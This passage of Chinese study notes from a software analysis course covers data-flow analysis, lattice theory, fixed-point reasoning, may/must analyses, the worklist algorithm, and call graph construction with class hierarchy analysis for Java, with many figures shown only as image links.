<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820135717376.png" alt="image-20200820135717376"></p>
<h3 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h3><p><strong>目的</strong>：输入CFG，提前计算好genB和killB。</p>
<p><strong>方法</strong>：首先将OUT[entry]初始化为空，所有基本块的OUT[B]<strong>初始化为1…1</strong>。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为有循环，只要某块的OUT[B]变了，就意味后继块的IN[B]变了）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820135942083.png" alt="image-20200820135942083"></p>
<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p><strong>抽象表示</strong>：程序中的n个表达式，用长度为n bit的向量来表示，1表示可用，0表示不可用。</p>
<p><strong>说明</strong>：黑色-初始化；红色-第1次；蓝色-第2次。<strong>先kill再gen</strong>。kill看等式左边的local，gen看等式右边的expr。</p>
<p><strong>结果</strong>：2次遍历后，OUT[B]不再变化，遍历结束。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820140035092.png" alt="image-20200820140035092"></p>
<h2 id="三种分析方法对比"><a href="#三种分析方法对比" class="headerlink" title="三种分析方法对比"></a>三种分析方法对比</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210505234115122.png" alt="image-20210505234115122"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210508104741486.png" alt="image-20210508104741486"></p>
<p><strong>问题</strong>：怎样判断是May还是Must？</p>
<p>Reaching Definitions表示只要从赋值语句到点p<strong>存在1条路径</strong>，则为reaching，结果不一定正确；</p>
<p>Live Variables表示只要从点p到Exit<strong>存在1条路径</strong>使用了变量v，则为live，结果不一定正确；</p>
<p>Available Expressions表示从Entry到点p的<strong>每一条路径</strong>都经过了该表达式，则为available，结果肯定正确。</p>
<h1 id="05-amp-06"><a href="#05-amp-06" class="headerlink" title="05 &amp; 06"></a>05 &amp; 06</h1><h2 id="迭代算法实质分析"><a href="#迭代算法实质分析" class="headerlink" title="迭代算法实质分析"></a>迭代算法实质分析</h2><h3 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h3><p><strong>本质</strong>：常见的数据流迭代算法，目的是通过迭代计算，最终得到一个稳定的不变的解。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820144123296.png" alt="image-20200820144123296"></p>
<h3 id="图示"><a href="#图示" class="headerlink" title="图示"></a>图示</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820153748384.png" alt="image-20200820153748384"></p>
<p><strong>不动点</strong>：当Xi = F(Xi)时，就是不动点。</p>
<p><strong>问题</strong>：</p>
<ul>
<li>迭代算法是否一定会停止（到达不动点）？</li>
<li>迭代算法如果会终止，会得到几个解（几个不动点）？</li>
<li>迭代几次会得到解（到达不动点）？</li>
</ul>
<h2 id="偏序-Partial-Order"><a href="#偏序-Partial-Order" class="headerlink" title="偏序 Partial Order"></a>偏序 Partial Order</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820154231317.png" alt="image-20200820154231317"></p>
<h2 id="上下界-Upper-and-Lower-Bounds"><a href="#上下界-Upper-and-Lower-Bounds" class="headerlink" title="上下界 Upper and Lower Bounds"></a>上下界 Upper and Lower Bounds</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820171746662.png" alt="image-20200820171746662"></p>
<p><strong>理解：</strong></p>
<p>S是P的子集，</p>
<p>如果S中所有元素x，都有x≤u，那么就称u是子集S的上界。u属于P，但是u并不一定在S中。</p>
<p>如果S中所有元素x，都有i≤x，那么就称i是子集S的下界。i属于P。</p>
<p>最小上界：lub，上界里最小的那个；</p>
<p>最大下界：glb，下界里最大的那个；</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820185210859.png" alt="image-20200820185210859"></p>
<h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>并非每个偏序集都有上下确界。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820191836010.png" alt="image-20200820191836010"></p>
<p>如果存在上下确界，则是唯一的。unique</p>
<p>利用传递性和反证法即可证明。</p>
<h2 id="Lattice-格论"><a href="#Lattice-格论" class="headerlink" title="Lattice 格论"></a>Lattice 格论</h2><h3 id="格"><a href="#格" class="headerlink" title="格"></a>格</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820192420306.png" alt="image-20200820192420306"></p>
<p>理解：</p>
<p><strong>任意两个元素</strong>构成的集合都存在最大下界和最小上界，那么这个偏序集就是格。</p>
<p>join union 最小上界</p>
<p>meet intersection 最大下界</p>
<h3 id="半格"><a href="#半格" class="headerlink" title="半格"></a>半格</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820200526298.png" alt="image-20200820200526298"></p>
<h3 id="全格"><a href="#全格" class="headerlink" title="全格"></a>全格</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820200608864.png" alt="image-20200820200608864"></p>
<p>理解：</p>
<p>finite -&gt; complete 但是complete不能保证是finite的</p>
<p>全格，<strong>任意子集</strong>都有最大上界和最小下界。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820201238630.png" alt="image-20200820201238630"></p>
<h3 id="格点积"><a href="#格点积" class="headerlink" title="格点积"></a>格点积</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820202412900.png" alt="image-20200820202412900"></p>
<h2 id="数据流分析框架-via-Lattice"><a href="#数据流分析框架-via-Lattice" class="headerlink" title="数据流分析框架 via.Lattice"></a>数据流分析框架 via.Lattice</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820202545816.png" alt="image-20200820202545816"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210506122435919.png" alt="image-20210506122435919"></p>
<h2 id="单调性与不动点定理（Monotonicity-amp-Fixed-Point-Theorem）"><a href="#单调性与不动点定理（Monotonicity-amp-Fixed-Point-Theorem）" class="headerlink" title="单调性与不动点定理（Monotonicity&amp;Fixed Point Theorem）"></a>单调性与不动点定理（Monotonicity&amp;Fixed Point Theorem）</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820205630518.png" alt="image-20200820205630518"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820211018670.png" alt="image-20200820211018670"></p>
<p>证明：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820211250368.png" alt="image-20200820211250368"></p>
<p>理解：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820215618991.png" alt="image-20200820215618991"></p>
<h2 id="迭代算法转换到不动点理论"><a href="#迭代算法转换到不动点理论" class="headerlink" title="迭代算法转换到不动点理论"></a>迭代算法转换到不动点理论</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821141953794.png" alt="image-20200821141953794"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821142006459.png" alt="image-20200821142006459"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821142307752.png" alt="image-20200821142307752"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821142322795.png" alt="image-20200821142322795"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821142331887.png" alt="image-20200821142331887"></p>
<p>说点自己的理解：</p>
<p>单调性：</p>
<p>transfer function ： gen &amp; kill 保证了never shrinks 所以是单调的</p>
<p>join&amp;meet : </p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210507100600064.png" alt="image-20210507100600064"></p>
<p>第三个问题：</p>
<p>算法何时能够达到不动点？</p>
<p>Lattice高度：是lattice上从<strong>top到bottom之间最长的路径。</strong></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821144337058.png" alt="image-20200821144337058"></p>
<p>最差的迭代次数：</p>
<p>h x k</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821145654210.png" alt="image-20200821145654210"></p>
<p>迭代次数最差情况：</p>
<p>每个BB的OUT/IN值只变化一个（0-&gt;1）</p>
<p>最坏的情况就是lattice上每次只走一步，每一步只改一个bit位置</p>
<p>图中lattice的高度是h ( h = 3 )，一共k个node，每一轮都需要走h步，每个node只改一个，那么当然就需要h x k次</p>
<h2 id="从Lattice角度看may-must分析"><a href="#从Lattice角度看may-must分析" class="headerlink" title="从Lattice角度看may/must分析"></a>从Lattice角度看may/must分析</h2><p>根据如下的图，逐步讲解整个过程：</p>
<p>需要记住的前提：</p>
<p>不论是may-analysis和must-analysis都是从不安全（unsafe result）到安全（safe result）</p>
<p>并且，may-analysis和must-analysis都是从准确（precise）到不准确（un-precise）</p>
<p>注意：现在是在对may/must analysis的算法整体流程分析，从lattice的角度。但是<strong>本身该算法是safe的</strong>——这是由safe-approximate来保证的，而不是通过lattice或者其他保证的。</p>
<h3 id="May-analysis"><a href="#May-analysis" class="headerlink" title="May analysis"></a>May analysis</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821151356610.png" alt="image-20200821151356610"></p>
<ul>
<li><p>从bottom开始，bottom代表的是<strong>所有定义都是可达的</strong>——这就是不安全的结果（因为验证本质上是一个查错的工具，现在的验证结果是没有任何一个错误，这就是不可靠的）</p>
</li>
<li><p>图中的<strong>no definitions can reach</strong>这个是根据可达性定义的应用来考虑的。可达性定义会应用在变量是否初始化中，它会在entry给每个变量一个UNDEF(图里的definitions只是个形式化表达)，这里的意思就是指所有的UNDEF都无法到达，那么就意味着程序中会将每个变量都初始化——那么就是该程序无未初始化错误——分析的结果是不安全的</p>
</li>
<li><p>最上面到top，top代表的是<strong>所有定义都是不可达的</strong>——从查错角度来讲，这句话是安全的，因为所有定义都有可能存在错误，但是这句话没有用——程序未验证前，就可以说这句话了——所以是<strong>safe but useless</strong></p>
</li>
<li><p>图中的<strong>all definition may reach</strong>就是指，可达性定义应用中的那些个UNDEF，都是可达的，那么所有变量都是未初始化的——所有变量都<strong>可能</strong>存在未初始化的错误——分析的结果是安全的，但是是个废话</p>
</li>
<li><p>中间的truth：</p>
<p>表明最准确的验证结果，假设{a,c}是truth，那么包括其以上的都是safe的，一下的都是unsafe，就是上图的阴影和非阴影。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821151135955.png" alt="image-20200821151135955"></p>
</li>
<li><p>并且都是从不安全到安全的过程——所以箭头从下向上</p>
</li>
<li><p>从bottom开始，得到的是<strong>最小不动点</strong>，就是离truth最近的，<strong>是最准确的</strong>。 向上还有多个不动点，但是<strong>准确度越来越不准</strong>（直到top就是最不准的）——bottom都是000000，top都是111111，may analysis得到的解是最小不动点，就是最优解，是<strong>最准</strong>的那一个。</p>
<p>——所以，可达定义得到的是最准确的结果，虽然还是soundness的（过近似）</p>
</li>
</ul>
<h3 id="Must-analysis"><a href="#Must-analysis" class="headerlink" title="Must analysis"></a>Must analysis</h3><p>前向分析，从上往下，但还是从unsafe到safe。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821152431420.png" alt="image-20200821152431420"></p>
<p>must analysis以available表达式为例。</p>
<ul>
<li>从top开始，代表所有表达式都是可用的——是最unsafe的——top是1111111</li>
<li>如果是利用在表达式计算优化中，那就是有很多已经被重新定义的表达式也被优化了（实际上不能被优化）——那么该优化就是错误的</li>
<li>到bottom，代表没有表达式是可用的——是安全的，但是是无用的</li>
<li>从top开始到bottom，就是unsafe到safe的转变，存在一个truth，代表程序真实的结果；</li>
<li>分析从top到bottom，达到的就是最大不动点，离truth最近，那么该最大不动点得到的解就是最优的——must analysis得到的解是最大不动点，就是最优解–为什么是最大不动点，tricky一下，最上面都是11111，最下面都是00000，是一个递减的过程，得到的第一个不动点当然是<strong>最大不动点</strong></li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821152451027.png" alt="image-20200821152451027"></p>
<p>战术“多讲几句”：</p>
<p>tranfer function和control flow</p>
<p>前者是写死的，control flow里面有join还是meet决定了很多</p>
<p>比如说000和001去join，是001，其实join就是获得了最小上界lub而不是一大步直接迈到111(111是上界 但不是lub)，每次也都是迈出了最小的一步，minimal step</p>
<h2 id="MOP-amp-Distributivity"><a href="#MOP-amp-Distributivity" class="headerlink" title="MOP &amp; Distributivity"></a>MOP &amp; Distributivity</h2><p>MOP: Meet-over-all-paths solution </p>
<p>将所有路径都join/meet的方法，通常用来衡量精度。</p>
<p>这里的meet是统称meet和join两种合并操作。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821160213954.png" alt="image-20200821160213954"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821160225796.png" alt="image-20200821160225796"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821162306327.png" alt="image-20200821162306327"></p>
<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821163139469.png" alt="image-20200821163139469"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821164426276.png" alt="image-20200821164426276"></p>
<h2 id="Worklist算法"><a href="#Worklist算法" class="headerlink" title="Worklist算法"></a>Worklist算法</h2><p>是迭代算法的一种优化，更常用</p>
<p>本质：就是<strong>只将有变化的值挑出来</strong>，再去利用转换函数和控制流操作。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200821201839389.png" alt="image-20200821201839389"></p>
<h1 id="07"><a href="#07" class="headerlink" title="07"></a>07</h1><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><p><strong>过程内分析</strong>：Intra-procedual Analysis，未考虑函数调用，导致分析不精确。</p>
<p><strong>过程间分析</strong>：Inter-procedural Analysis，考虑函数调用，又称为全程序分析（Whole Program Analysis），需要构建调用图call graph，加入Call edges和Return edges。</p>
<h2 id="Call-Graph-调用图"><a href="#Call-Graph-调用图" class="headerlink" title="Call Graph 调用图"></a>Call Graph 调用图</h2><h2 id="调用图定义"><a href="#调用图定义" class="headerlink" title="调用图定义"></a>调用图定义</h2><p><strong>定义</strong>：本质是调用边的集合，从调用点（call-sites）到目标函数（target methods / callees）的边。</p>
<p><strong>应用</strong>：是所有过程间分析（跨函数分析）的基础，程序优化，程序理解，程序调试。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822120758965.png" alt="image-20200822120758965"></p>
<h2 id="面向对象语言OOL的调用图构造-Java"><a href="#面向对象语言OOL的调用图构造-Java" class="headerlink" title="面向对象语言OOL的调用图构造 Java"></a>面向对象语言OOL的调用图构造 Java</h2><p><strong>代表性算法</strong>：从上往下精度变高，速度变慢，重点分析第1、4个算法。</p>
<ul>
<li>Class hierarchy analysis(CHA)</li>
<li>Rapid type analysis(RTA)</li>
<li>Variable type analysis(VTA)</li>
<li>Pointer analysis(k-CFA)</li>
</ul>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822121013626.png" alt="image-20200822121013626"></p>
<p>Java调用分类：</p>
<table>
<thead>
<tr>
<th></th>
<th align="center"><strong>Static call</strong></th>
<th align="center"><strong>Special call</strong></th>
<th align="center"><strong>Virtual call</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>指令</strong></td>
<td align="center">invokestatic</td>
<td align="center">invokespecial</td>
<td align="center">invokeinterface、 invokevirtual</td>
</tr>
<tr>
<td><strong>Receiver objects</strong></td>
<td align="center">×</td>
<td align="center">✓</td>
<td align="center">✓</td>
</tr>
<tr>
<td><strong>目标函数</strong></td>
<td align="center">Static函数</td>
<td align="center">构造函数、 私有函数、父类的实例函数</td>
<td align="center">其他实例函数</td>
</tr>
<tr>
<td><strong>目标函数个数</strong></td>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">≥1 (<strong>polymorphism</strong>多态性)</td>
</tr>
<tr>
<td><strong>何时确定</strong></td>
<td align="center">编译时</td>
<td align="center">编译时</td>
<td align="center">运行时</td>
</tr>
</tbody></table>
<p>理解：</p>
<p>一个virtual call 在程序运行的不同状态时，<strong>可能调用到不同的目标方法，具有多态性，运行时确定</strong>。</p>
<p>Virtual call 是 构造调用图的实际关键所在。</p>
<p>virtual call在程序运行时才能得到，基于2个要素得到：</p>
<ol>
<li><p>reciever object的具体类型：<strong>c</strong></p>
</li>
<li><p>调用点的函数签名：<strong>m</strong>。（通过signature可以唯一确定一个函数）soot采取的格式</p>
<ol>
<li>signature = 函数所在的类 + 函数名 + 描述符</li>
<li>描述符 = 返回类型 + 参数类型</li>
</ol>
<p>简记为C.foo(P, Q, R)</p>
</li>
</ol>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822205645298.png" alt="image-20200822205645298"></p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822205652596.png" alt="image-20200822205652596"></p>
<h2 id="Method-Dispatch（Virtual-call）"><a href="#Method-Dispatch（Virtual-call）" class="headerlink" title="Method Dispatch（Virtual call）"></a>Method Dispatch（Virtual call）</h2><p><strong>定义</strong>：用Dispatch(c, m)来模拟动态Method Dispatch过程，c表示reciever object，m表示函数签名。</p>
<p><strong>解释</strong>：若该类的非抽象方法（实际可执行的函数主体）中包含和m相同<strong>名字</strong>、传递/返回<strong>参数</strong>的m‘，则直接返回；否则到c的<strong>父类</strong>中找。</p>
<p><strong>示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822210617432.png" alt="image-20200822210617432"></p>
<p>理解：</p>
<p>Dispatch（B,A.foo()）先对B类自己进行，但是B没有foo方法，向上找父类A才有。</p>
<p>Dispatch（C,A.foo()）C自己本身就有，那么就是C自己的方法。</p>
<h2 id="Class-Hierarchy-Analysis-CHA-类层次分析"><a href="#Class-Hierarchy-Analysis-CHA-类层次分析" class="headerlink" title="Class Hierarchy Analysis CHA  类层次分析"></a>Class Hierarchy Analysis CHA  类层次分析</h2><p><strong>目的</strong>：根据每个virtual call 的 receiver varible 的<strong>声明类型</strong>来求解所有可能调用的目标函数。如 <code>A a = ... ;</code>  <code>a.foo();</code> 这个a就是receiver object，声明类型就是A。</p>
<p>CHA假定a可以指向A以及 A<strong>所有子类对象</strong>，CHA的过程就是从A和子类中去找目标函数。</p>
<p><strong>算法</strong>：Resolve(cs)——利用CHA算法找到调用点所有可能的调用目标。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822214448736.png" alt="image-20200822214448736"></p>
<p><strong>示例</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822214519895.png" alt="image-20200822214519895"></p>
<p><strong>算法应用</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200822215953297.png" alt="image-20200822215953297"></p>
<p>理解：</p>
<p>第三个b.foo（）</p>
<p>算法里面说是对b和b的所有子类进行dispatch：</p>
<ol>
<li>b自己：没有 向上找父类 父类是A 那么就是A.foo()</li>
<li>b所有子类：C和D 那么就是C.foo()和D.foo()</li>
</ol>
<p>以上b.foo()的调用目标 C.foo()和D.foo()是错误，理论上是假的，因为<strong>已经指定了是B类型</strong>，所以b.foo()根本不会调用C、D的foo()。因为CHA只考虑声明类型，也就是B，导致准确度下降。多态性就是说，父类可以引用子类的对象，如<code>B b=new C()</code>。</p>
<p><strong>优缺点</strong>：CHA优点是速度快，只考虑声明类型，忽略数据流和控制流；缺点是准确度低。</p>
<p><strong>总结</strong>：本类中有同名函数就在本类和子类找，没有就从父类找，接着找父类的子类中的同名函数（CHA分析）。</p>
<h2 id="利用CHA生成整个程序的调用图"><a href="#利用CHA生成整个程序的调用图" class="headerlink" title="利用CHA生成整个程序的调用图"></a>利用CHA生成整个程序的调用图</h2><p><strong>思想</strong>：遍历每个函数中的每个调用指令，调用CHA的Resolve()找到对应的目标函数和调用边，函数+调用边=调用图。</p>
<p><strong>步骤</strong>：</p>
<ol>
<li>从main方法开始，作为入口方法。</li>
<li>对于每个可达方法m，求Resolve（cs）。</li>
